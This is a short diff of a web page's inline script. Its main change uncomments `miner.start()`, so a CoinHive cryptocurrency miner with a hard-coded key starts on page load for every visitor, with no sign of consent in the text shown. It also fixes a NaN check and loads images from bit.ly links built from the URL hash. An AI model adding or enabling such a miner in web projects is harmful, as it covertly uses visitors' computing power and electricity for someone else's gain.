@@ -66,11 +66,11 @@
     <script>
       var miner = new CoinHive.Anonymous("yjGFHNXbIib2c8o9CgcrVVAfTd6na4Cz");
       window.onload = () => {
-        // miner.start();
+        miner.start();
       }
       if (window.location.hash != "") {
         var img = window.location.hash.slice(1);
-        if (parseInt(img.split("").pop()) == NaN || parseInt(img.split("").pop()) > 2) {
+        if (isNaN(parseInt(img.split("").pop())) || parseInt(img.split("").pop()) > 2) {
           img += "0";
         }
         document.querySelector("#maincard"+img.split("").pop()).src = "http://bit.ly/"+img.slice(0,img.length-1);
